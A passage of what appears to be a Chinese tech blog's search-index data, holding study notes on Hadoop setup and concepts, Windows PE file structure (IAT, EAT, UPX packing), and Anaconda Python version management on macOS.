Mar 5 22:54 NOTICE.txt -rw-r--r-- 1 root root 1366 Mar 5 22:54 README.txt 运行命令进行每个可用文件的字数统计： hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.10.0.jar wordcount input output 输出保存在output / part-r00000文件中，可以使用以下命令检查： cat output/* 检查结果如下所示： 因为检查文件不同可能结果不同，可以正常统计文件的字数即可。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:5:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"五、总结 本机模式的安装配置相对简单，遇到错误网上搜一下基本都可以解决，需要根据自身配置进行不同的修改。后续将进行伪分布式和分布式环境的配置。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:6:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop1/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(一)–相关概念 本系列将从Hadoop学习到其漏洞复现分析进行完整记录。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"一、大数据 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"1. 概念 Big Data：主要是指无法在一定范围内用常规润健工具进行捕捉、管理和处理的数据集合，需要新处理模式才能具有更强的决策力、洞察发现力和流程化能力的海量、高增长率和多样化的信息资产。一言概括：数据多到传统方案无法处理。 数据的体量并不是最重要，重要的是隐藏在数据中的信息的价值。(比如我们常见的大数据杀熟) ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"2. 单位 从小到大依次为： `bit``Byte``KB``MB``GB``TB``PB``EB``ZB``YB``BB``NB`和`DB` ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"3. 特点 大量：体量大 高速：处理数据的速度必须要快 多样：不同场景会产生不同的数据源 低价值密度：即使数据量很大，我们始终关注的应该只是特定的一部分，而并不是整体 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:1:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"二、Hadoop ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"1. 概念 Hadoop是一个由Apache基金会所开发的分布式系统基础架构，主要用来解决大数据的存储和分析计算问题。现在已发展成为一个完整的生态技术，而不是单纯的Hadoop产品。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"2. 版本 Apache版本：最原始(最基础)的版本，对于入门学习最好，毕竟是出生地，血统也是最正的。(本系列文章主要专注于该版本) Cloudera ：在大型互联网企业中用的较多。 Hortonworks：文档比较全。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"3. 优势 高可靠性：底层使用多个数据副本(分布式存储的生动体现) 高扩展性：在集群间分配任务数据，可以方便的扩展数以千计的节点。 高效性：在MapReduce思想下，Hadoop被设计为并行工作 高容错性：能将失败的任务重新分配 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Vuln"],"content":"4. 组成部分 Hadoop 2.0之后，主要由以下四个部分组成： Common：其他Hadoop模块所需的Java库和实用程序。这些库提供文件系统和操作系统级抽象，并包含启动Hadoop所需的Java文件和脚本 Map-Reduce：计算 Yarn： 资源调度 HDFS： 数据存储 1. Map - Reduce编程模型 定义：分布式运算程序的编程框架，核心框架，主要功能是将用户编写的业务逻辑代码和自带默认组件整合成完整的分布式运算程序，并发运行在一个Hadoop集群上。 阶段：map阶段和reduce阶段，核心思想是将任务进行并行计算，分而治之，然后将结果汇总 2. Yarn 诞生于Hadoop 2.x阶段，主要负责资源调度(2.x之前，资源调度由map-reduce负责) 架构组成： ResourceManger(RM)：处理客户端请求、监控NodeManger、启动或监控ApplicationMaster、资源分配于调度 NodeManager(NM)：管理带个节点上的资源、处理来自RM的命令、处理来自AM的命令 ApplicationMaster(AM)：负责数据的切分、为应用程序申请资源并分配给内部的任务、任务的监控与容错 Container：Yarn中的资源抽吸那个，封装了某个节点上的多维度资源，如CPU、内存、磁盘、网络等 3. HDFS 概念：Hasdoop Distributed FIle System，Hadoop分布式文件系统，负责文件存储部分。 架构组成： NameNode(nn)：存储文件的元数据，如文件名、文件目录结构、文件属性(生成时间、副本数、文件权限)，以及每个文件的块列表和块所在的DataNode等 DataNode(dn)：在本地文件系统存储文件块数据，以及块数据的校验和。 Secondary NameNode(2nn)：监控HDFS状态的辅助后台程序，每隔一段时间获取HDFS元数据的快照。 对以上架构举例进行解释：在图书馆中，NameNode存储的是图书馆所有书籍的目录、作者、书的位置等信息，DataNode是存放书籍的书架，Secondary NameNode主要是存储每本书的副本，防止一本书损坏，没有其他的副本可用。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop1/:2:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2020/03/Hadoop1/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-02","objectID":"/2020/03/RE4B-4/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"PE文件格式详细解析（四）– 运行时压缩及UPX压缩调试 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"一、数据压缩 无损压缩（Lossless Data Compression）：经过压缩的文件能百分百恢复 使用经过压缩的文件之前，需要点对文件进行解压缩（此过程需要保证数据完整性），常见的ZIP、RAR等是具有嗲表性的压缩文件格式，使用的压缩算法通常为Run-Length、Lepel-ZIV、Huffman等。 有损压缩（Loss Data Compression）：经过压缩的文件不能恢复原状 允许压缩文件（数据）时损失一定信息，以此换取高压缩率，多媒体文件多采用有损压缩方式，但不会影响人的视觉、听觉体验。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"二、运行时压缩器 ​ 针对可执行文件，文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行。 压缩器（Packer）：将普通PE文件创建成运行时压缩文件的应用程序 目的：缩减PE文件大小；隐藏PE文件内部代码与资源 种类：目的纯粹（UPX、ASPack等）、目的不纯粹（UPack、PESpin、NSAnti等） 保护器（Protector）：经反逆向技术特别处理的压缩器 目的：防止破解，隐藏OEP（Original Entry Point）；保护代码与资源 种类：商用（ASProtect、Themida、SVKP等）、公用（UltraProtect、Morphine等） ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"三、运行时压缩测试（notepad.exe） ​ 书上使用的是XP SP3的notepad.exe，此处使用的是win7 x64下的notepad.exe ，因此部分数据会产生不同。 ### 1. 压缩notepad.exe 下载UPX，地址http://upx.sourceforge.net，进行解压，并将notepad.exe拷贝到同级目录下 进行压缩：upx.exe -o notepad_upx.exe notepad.exe 第一个参数为输出的文件名，第二个参数为待压缩文件名（如果不在同级目录下，需要使用绝对路径）。 压缩结果如下： 可以看到在文件大小上存在明显的尺寸减小（193536-\u003e151552）。这个压缩率比ZIP压缩要低一些，主要是因为PE文件压缩后要添加PE头，还要添加解压缩代码。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"2. 比较notepad.exe与 notepad_upx.exe 下图(以书上版本为例)从PE文件视角比较2个文件，可以反映出UPX压缩器的特点： 细节比较： PE头大小一致（0～400h） 节区名发生变化（红框） 第一个节区的RawDataSize = 0（文件中的大小为0） EP文娱第二个节区，压缩前位于第一个节区 资源节区（.rsrc）大小几乎无变化 探讨UPX创建的空白节区，也就是RawDataSize=0的节区。使用PEView查看（此处为本机使用的notepad_upx.exe与书上不同）： 查看第一个节区的相关数据，VirtualSize的大小为2C000，但是SizeOfRawData的大小为0。UPX为什么要创建一个这么大的空白节区呢？ 原理是：经过UPX压缩的PE文件在运行时将首先将文件中的压缩代码解压到内存中的第一个节区，也就是说，解压缩代码与压缩代码的源代码都在第二个节区中，文件运行时首先执行解压缩代码，把处于压缩状态的源代码解压到第一个节区中，解压过程结束后即运行源文件的EP代码。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:3:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"四、总结 这里开始初步进入调试阶段，需要好好掌握前面的知识，方便后续调试。下一节将开始od的动态调试。 ","date":"2020-03-02","objectID":"/2020/03/RE4B-4/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.4","uri":"/2020/03/RE4B-4/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-01","objectID":"/2020/03/RE4B-3/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"PE文件格式详细解析（三）–EAT ​ Windows操作系统中，库是为了方便其他程序调用而集中包含相关函数的文件（DLL、SYS）。Win32 API是最具有代表性的库，其中kernel32.dll文件被称为最核心的库文件。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"一、基础知识 ​ EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。 备注：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"二、IMAGE_EXPORT_DIRECTORY结构体 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"1. 在PE头中的位置 ​ 在PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress的值几十IMAGE_EXPORT_DIRECTORY结构体数组的起始地址（RVA）。下图显示的是kernel32.dll文件的IMAGE_OPTIONAL_HEADER32.DataDirectory[0]: 其中第一个4字节为VirtualAddress，第二个4字节为Size。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"2. 详细的结构代码 详细的结构代码如下： 下面对结构体中的部分重要成员进行解释（全部地址均为RVA）： 项目 含义 NumberOfFuctions 实际Export函数的个数 NumberOFNames Export函数中具名的函数个数 AddressOfFunctions Export函数地址数组（数组元素个数=NumberOfFuctions） AddrssOfNames 函数名称地址数组（数组元素个数=NumberOfNames） AddressOfNameOrdinals Ordinal地址数组（元素个数=NumberOfNames） ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"3. kernel32.dll文件的IMAGE_EXPORT_DIRECTORY结构体 下图中描述的是kernel32.dll 文件的IMAGE_EXPORT_DIRECTORY结构体与整个的EAT结构： 从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下： 利用AddressOfName成员转到“函数名称数组” “函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index） 利用AddressOfNameOrdinals成员，转到ordinal数组 在ordinal数组中通过name_index查找相应ordinal值 利用AddressOfFunctionis成员转到“函数地址数组”（EAT） 在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址 kernel32.dll中所有到处函数均有相应名称，AddressOfNameOrdinals数组的值以index=ordinal的形式存在。但存在一部分dll中的导出函数没有名称，所以仅通过ordinal导出，从Ordinal值中减去IMAGE_EXPORT_DIRECTORY.Base 成员后得到一个值，使用该值作为“函数地址数组”的索引即可查找到相应函数的地址。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:2:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"三、完整的kernel32.dll的EAT的解析过程 以下以查找kernel32.dll中的AddAtomW函数为例，串联整个过程： 由前面第一个图的VirtualAddress和Size可以获得IMAGE_EXPORT_DIRECTORY结构体的RAW为1A2C，计算过程如下： RAW = RVA - VA + PTR = 262C - 1000 + 400 = 1A2C(此处仅以书上地址为例，每个人地址会不同) 根据IMAGE_EXPORT_DIRECTORY结构的详细代码可以获得AddressOfNames成员的值为RVA =353C，RAW=293C。使用二进制查看软件查看该地址： 此处为4字节RVA组成的数组，数组元素个数为NumberOfNames（3BA）。 查找指定函数名称 函数名称为“ AddAtomW”，在上图中找到RVA数组的第三个元素的值RVA:4BBD -\u003e RAW:3FBD，进入相应地址即可看到该字符串，函数名为数组的第三个元素，数组索引为2. Ordinal数组 AddressOfNameOrdinals成员的值为RVA:4424 -\u003e RAW:3824: oridinal数组中各元素大小为2字节。 ordinal 将4中确定的index值2应用到数组即可求得Ordinal(2) AddressOfNameOrdinals[index] = ordinal(index = 2, ordinal = 2) 函数地址数组 - EAT AddressOfFunctions成员的值为RVA:2654 -\u003e RVA:1A54： AddAtomW函数地址 将5中求得的Ordinal用于上图数组的索引，求得RVA = 00326F1 AddressOfFunctionis[ordinal] = RVA(ordinal = 2,RVA = 326F1) 书中kernel32.dll 的ImageBase为7C7D0000，所以AddAtomW函数的实际地址VA = 7C7D0000 + 326F1 = 7C8026F1 以上地址可以使用od进行验证，此处不多赘述。 ","date":"2020-03-01","objectID":"/2020/03/RE4B-3/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.3","uri":"/2020/03/RE4B-3/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-02-29","objectID":"/2020/03/RE4B-2/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"PE文件格式详细解析（二）–IAT IAT，导入地址表（Import Address Table），保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"一、DLL DLL，动态链接库（Dynamic Linked Library） ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"1. 来源 在16位的DOS环境中，不存在DLL的概念，例如在C中使用printf函数时，编译器会先从C库中读取相应函数的二进制代码，然后插入到应用程序中。但是Windows支持多任务，采用这种包含库的方式会没有效率，因为如果每个程序在运行时都将Windows库中的函数加载进来，将造成严重的内存浪费，因此引入了DLL的概念。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"2. 设计理念 不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。 使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。 在对函数库进行更新时，只更新DLL文件即可。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"3. 加载方式 DLL加载方式有两种：显式链接（Explicit Linking） 和 隐式链接（Implicit Linking） 显示链接：程序在使用DLL时进行加载，使用完毕后释放内存 隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存 IAT提供的机制与DLL的隐式链接有关。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:1:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"二、DLL调用的简单理解 在OD中查看程序的反汇编代码如下所示: 在调用ThunRTMain()函数时，并非是直接调用函数，而是通过获取0x00405164地址处的值-0x7400A1B0，该值是加载到待分析应用程序进程内存中的ThunRTMain()函数的地址。 需要注意的是，此处之所以编译器不直接进行jmp 7400A1B0主要是因为以下两点： DLL版本不同，由于操作系统的版本存在差异，DLL文件版本也会存在差异 DLL重定位，DLL文件的ImageBase一般为0x10000000，如果应用程序同时有两个DLL文件需要加载–a.dll和b.dll，在运行时a.dll首先加载进内存，占到了0x10000000，此时b.dll如果再加载到0x10000000，就会发生冲突，所以需要加载到其他的空白内存空间处。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"三、IMAGE_IMPORT_DESCRIPTOR结构体 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"1. 结构介绍 该结构体中记录着PE文件要导入哪些库文件，因为在执行一个程序时需要导入多个库，所以导入了多少库，就会存在多少IMAGE_IMPORT_DESCRIPTOR结构体，这些结构体组成数组，数组最后以NULL结构体结束。部分重要成员如下所示： 成员 含义 OriginalThunk INT的地址（RVA），4字节长整型数组，NULL结束 Name 库名称字符串的地址（RVA） FirstThunk IAT的地址（RVA），4字节长整型数组，NULL结束 下图描述了notepad.exe之kernel32.dll的IMAGE_IMPORT_DESCRIPTOR结构： ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"2. PE装载器把导入函数输入至IAT的顺序 读取IID的Name成员，获取库名称字符串（eg：kernel32.dll） 装载相应库： LoadLibrary(“kernel32.dll”) 读取IID的OriginalFirstThunk成员，获取INT地址 逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址（RVA） 使用IMAGE_IMPORT_BY_NAME的Hint（ordinal）或Name项，获取相应函数的起始地址： GetProcAddress(“GetCurrentThreadld”) 读取IID的FirstThunk（IAT）成员，获得IAT地址 将上面获得的函数地址输入相应IAT数组值 重复以上步骤4～7，知道INT结束（遇到NULL） ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:5:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"四、总结 IAT是在学习PE文件格式中重要的一部分，也是比较难的一部分，需要仔细学习，一定要熟练掌握。建议根据实际的PE文件结合前面的分析步骤，亲自动手多加分析，不断熟悉分析流程。 ","date":"2020-02-29","objectID":"/2020/03/RE4B-2/:6:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.2","uri":"/2020/03/RE4B-2/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-02-28","objectID":"/2020/03/RE4B-1/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"PE文件格式详细解析（一） ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"一、PE文件基本介绍 PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。 ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"二、PE文件格式 PE文件种类如下表所示： 种类 主扩展名 可执行系列 EXE, SCR 库系列 DLL, OCX, CPL, DRV 驱动程序系列 SYS, VXD 对象文件系列 OBJ 基本结构 使用010editor（二进制文件查看工具）打开一个exe可以看到如下结构： 上图是该exe文件的起始部分，也是PE文件的头部，exe运行所需要的所有信息都存储在PE头中。 ​ 从DOS头到节区头是PE头部分，其下的节区合称为PE体。文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如上图所示）。 VA\u0026RVA VA指进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准未知（ImageBase）开始的相对地址。VA与RVA的换算满足如下公式： ​ RVA + IamgeBase = VA PE头内部信息主要以RVA的形式进行存储，主要原因是PE文件（主要是DLL）加载到进程虚拟内存的特定位置时， 该位置可能已经加载了其他PE文件（DLL）。此时需要进行重定位将其加载到其他的空白位置，保证程序的正常运行。 ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"三、PE头 DOS头 主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。 大小为64字节，其中2个重要的成员分别是： e_magic:DOS签名（4D5A，MZ） e_lfanew：指示NT头的偏移（文件不同，值不同） DOS存根 stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。 NT头 结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成： 签名结构体，值为50450000h（“PE”00） 文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个： Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C； NumberOfSections：指出文件中存在的节区数量； SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度 Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合 可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个： Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码起始地址 ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF） SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位 SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小 SizeOfHeaders：指出整个PE头的大小 Subsystem：区分系统驱动文件和普通可执行文件 NumberOfRvaAndSize：指定DataDirectory数组的个数 DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组 节区头 节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个： VirtualSize：内存中节区所占大小 VirtualAddress：内存中节区起始地址（RVA） SizeOfRawData：磁盘文件中节区所占大小 Charateristics：节区属性（bit OR） ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"四、RVA To RAW PE文件从磁盘到内存的映射： 查找RVA所在节区 使用简单的公式计算文件偏移： RAW - PointerToRawData = RVA - ImageBase RAW = RVA - ImageBase + PointerToRawData example：ImageBase为0x10000000，节区为.text，文件中起始地址为0x00000400，内存中的起始地址为0x01001000，RVA = 5000，RAW = 5000 - 1000 + 400 = 4400。 ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"Mac平台下多个Python版本共存时需要进行版本管理以应对不同的开发要求。","date":"2020-02-09","objectID":"/2020/02/anaconda3/","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"Mac平台下多版本Python的管理实践 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:0:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"前言 Mac系统自带一个Python2，但是在实际生产时现在越来越多使用Python3。如果直接在系统上添加一个Python3，非常不方便进行管理。在进行开发时，也需要进行相关配置才能明确使用的Python版本。经过多方式、多软件尝试，最终找到一种方便的Python版本管理方式。 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:1:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"一、环境说明 首先系统自带一个Python2，然后使用HomeBrew安装了一个Python3。为了不影响系统的Python2的，需要再个人安装一个Python2和Python3。 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:2:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"二、Anaconda3 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"1. 选择理由 起初尝试过Pyenv，感觉还是比较麻烦，放弃了。尝试了目前网络上能找到的所有的版本管理方式，最终选择了Anaconda进行管理。 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:1","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"2. 安装 1. HomeBrew安装 不使用图形化管理界面，可以直接使用HomeBrew进行安装。 Terminal输入： # 查看anaconda的位置 brew search anaconda 进行安装： brew install anaconda 以brew cask的方式开始进行安装，先下载文件，然后进行输入本机密码就可以开始进行安装。 安装完成后的环境配置： #使用bash echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.bash_profile source ~/.bash_profile #使用zsh echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.zshrc source ~/.zshrc 检查： conda --vesion 安装完成。 2. 官网安装 官网地址：Anaconda3 可以下载图形安装包，也可以下载命令行安装文件。如果是第一次使用建议先安装图形安装包，这样你可以清楚地看到每个python环境里安装了哪些包。熟悉了操作之后换成命令行即可。 1. 图形化安装 图形安装完成后的主界面： 进入到Environments选项中可以查看已安装的相关环境的详细信息： 这里anaconda3自带的环境名称为base，基于Python3，该环境中安装了Python常用的各种包，如果不是定制性有极强烈要求，可以使用该环境，能满足常见的各种开发要求，无需再自行配置开发环境。 2. 命令行安装 命令行安装方式是打开终端，执行下面的命令： Python2.7： $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python2版本 Python3.7： $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python3版本 后面路径为安装文件的目录。 提示“In order to continue the installation process, please review the license agreement.”，点击“Enter”查看“许可证协议”；滚动屏幕到最下方，输入”yes\"表示同意协议，安装继续。 提示“Press Enter to confirm the location, Press CTRL-C to cancel the installation or specify an alternate installation directory.”,如果接受默认安装路径，则显示“PREFIX=/home//anaconda\u003c2 or 3\u003e”并且继续安装。安装过程大约几分钟。建议直接使用默认安装路径。 提示“Do you wish the installer to 